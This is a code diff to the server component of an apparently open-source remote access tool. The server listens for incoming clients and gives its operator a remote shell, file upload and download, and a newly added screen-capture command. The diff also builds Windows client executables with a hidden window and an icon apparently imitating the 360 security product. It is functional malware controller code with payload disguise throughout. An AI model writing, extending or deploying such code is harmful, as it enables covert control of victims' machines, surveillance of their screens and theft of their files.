@@ -8,11 +8,16 @@ import os
 import sys
 import socket
 import subprocess
-from misc.encoding import Encode
 from misc.color import Colors
 from misc.logo import Logo
 from serverModule.shell import Shell
+from lib.dsSocket import *
 from serverModule.fileOperation import FileOPT
+from serverModule.screen import Screen
+
+def checkEnvironment():
+    if not os.path.isdir(r"./output/"):
+        os.mkdir(r"./output/")
 
 # 连接
 def connect(host, port):
@@ -24,7 +29,12 @@ def connect(host, port):
     server.listen(5)
     msg = " Server is Listening <%s:%s>\n    Waiting……" % (serverHost, serverPort)
     print(Colors.CYAN + "[*]" + Colors.END + msg)
-    clientSocket, clientAddress = server.accept()
+    try:
+        clientSocket, clientAddress = server.accept()
+    except KeyboardInterrupt:
+        server.close()
+        return
+    # clientSocket.settimeout(3600)
     print(Colors.GREEN + "[+]" + Colors.END + " Receive The Connection " + Colors.GREEN + "<%s:%s>" % (clientAddress[0], clientAddress[1]) + Colors.END)
     return server, clientSocket, clientAddress
 
@@ -33,11 +43,15 @@ def listen():
     try:
         host = input("Input LHOST：")
         port = int(input("Input LPORT："))
+        # host = "127.0.0.1"
+        # port = 9999
         server, clientSocket, clientAddress = connect(host, port)
     except OSError:
         print(Colors.YELLOW + "[!]" + Colors.END + " IP Address Error.")
     except ValueError:
         print(Colors.YELLOW + "[!]" + Colors.END + "Port Error.")
+    except KeyboardInterrupt:
+        pass
     else:
         optionsList = ["shell", "upload", "download", "quit", "q", "exit"]
         while True:
@@ -48,16 +62,19 @@ def listen():
                 if choice == "shell":
                     print(Colors.GREEN + "[+]" + Colors.END + " OS Shell Created")
                     shell = Shell(clientSocket)
-                    while True:
-                        if not shell.shell():
-                            break
+                    shell.shell()
                 elif choice[:6].lower() == "upload":
                     FileOPT(choice, clientSocket).fileUpload()
                 elif choice[:8].lower() == "download":
                     FileOPT(choice, clientSocket).fileDownload()
+                elif choice.lower() == "screen":
+                    Screen(clientSocket)
                 elif choice in ["quit", "q", "exit"]:
-                    clientSocket.send(choice.encode(Encode.encoding))
+                    # clientSocket.send(choice.encode(Encode.encoding))
+                    DShellSend(clientSocket, choice)
                     break
+            except KeyboardInterrupt:
+                break
             except:
                 pass
         clientSocket.shutdown(2)
@@ -86,15 +103,15 @@ def generateScript():
                 os.chdir("./docker-pyinstaller/src")
                 cmd = [ "pipreqs ./ --force", "docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-windows"]
                 subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).wait()
-                print(Colors.GREEN + "[+]" + Colors.END + "Sucessfully! The File in ./dist/")
+                print(Colors.GREEN + "[+]" + Colors.END + " Sucessfully! The File in ./dist/")
             else:
-                print(Colors.GREEN + "[+]" + Colors.END + "Sucessfully! The File in ./dist/")
+                print(Colors.GREEN + "[+]" + Colors.END + " Sucessfully! The File in ./dist/")
             for i in range(2):
                 os.chdir(os.path.abspath(os.path.pardir))
         # 当前运行平台是Windows
         elif "win" in localPlatform:
             if remotePlatform == "win":
-                subprocess.Popen("pyinstaller -Fw client_tmp.py", shell=True, stdout=subprocess.PIPE).wait()
+                subprocess.Popen("pyinstaller -Fw -i ./misc/360.ico client_tmp.py", shell=True, stdout=subprocess.PIPE).wait()
                 print(Colors.GREEN + "[+]" + Colors.END + " Sucessfully! The File in ./dist/")
             else:
                 if not os.path.exists("./dist/"):
@@ -136,7 +153,11 @@ def menu():
         print("Waiting……")
     elif choice == "4":
         print("Waiting……")
-    elif choice == "0":
+    elif choice[:10] == "urlExtract":
+        args = choice[10:]
+        cmd = sys.executable + " ./tools/urlExtractor/urlExtractor.py" + args
+        os.system(cmd)
+    elif choice == "0" or choice == "q":
         print("\nBye~")
         os._exit(0)
     else:
@@ -144,6 +165,7 @@ def menu():
 
 if __name__ == "__main__":
     Logo().printLogo()
+    checkEnvironment()
     while True:
         try:
             menu()
